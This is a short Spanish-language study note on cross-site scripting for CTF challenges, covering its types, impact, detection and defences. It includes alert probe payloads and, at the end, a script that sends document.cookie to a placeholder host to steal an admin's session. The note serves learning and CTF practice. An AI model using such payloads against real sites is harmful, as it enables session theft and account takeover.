# XSS (Cross-Site Scripting)

## ¿Qué es?
Es una vulnerabilidad que permite inyectar **scripts maliciosos** (generalmente JavaScript) en páginas que luego ven otros usuarios. A diferencia de SQLi (que ataca a la base de datos), XSS ataca a **los navegadores de otras personas** que visitan la página vulnerable.

## Tipos de XSS

| Tipo | Cómo funciona |
|---|---|
| **Reflejado** | El script se ejecuta inmediatamente, viene incluido en una URL que la víctima tiene que abrir (ej. un link manipulado que le mandan) |
| **Persistente (almacenado)** | El script queda guardado en la base de datos o el sistema, y se ejecuta cada vez que alguien carga esa página (ej. un comentario malicioso en un foro) |
| **Basado en DOM** | El script manipula el DOM directamente en el navegador de la víctima, sin que el payload pase por el servidor |

## Ejemplo básico
Si un campo de comentarios no sanitiza la entrada, escribir:
```html
<script>alert('Hacked!')</script>
```
haría que, cuando alguien vea ese comentario, su navegador ejecute ese script.

## Impacto real
- Robo de cookies de sesión (y con eso, secuestro de la cuenta de otro usuario).
- Redirección maliciosa a otro sitio.
- Keyloggers dentro de la página (capturar todo lo que la víctima escribe).
- Suplantación de identidad dentro del sitio.

## Cómo se identifica en un reto
- Buscar campos donde el input del usuario se refleje directamente en la página (comentarios, campos de búsqueda, nombres de usuario, parámetros de URL que se muestran en pantalla).
- Probar con un payload simple como `<script>alert(1)</script>` o `"><img src=x onerror=alert(1)>` y ver si se ejecuta.
- Si el reto simula que "un admin visitará tu link" (muy común en CTF), el objetivo suele ser robar la cookie del admin, no solo mostrar un alert.

## Protección (para entender qué se está evadiendo)
- Escapar el HTML antes de mostrarlo (que `<script>` se muestre como texto, no se interprete como código).
- Sanitizar todas las entradas de usuario.
- Políticas CSP (Content Security Policy), que restringen desde dónde puede cargar/ejecutar scripts una página.

## Nota práctica
En CTF, muchos retos de XSS no piden solo "hacer un alert" — piden robar una cookie y mandarla a un servidor propio. Para eso se combina el payload de XSS con algo como:
```html
<script>fetch('http://mi-servidor.com/robo?cookie=' + document.cookie)</script>
```
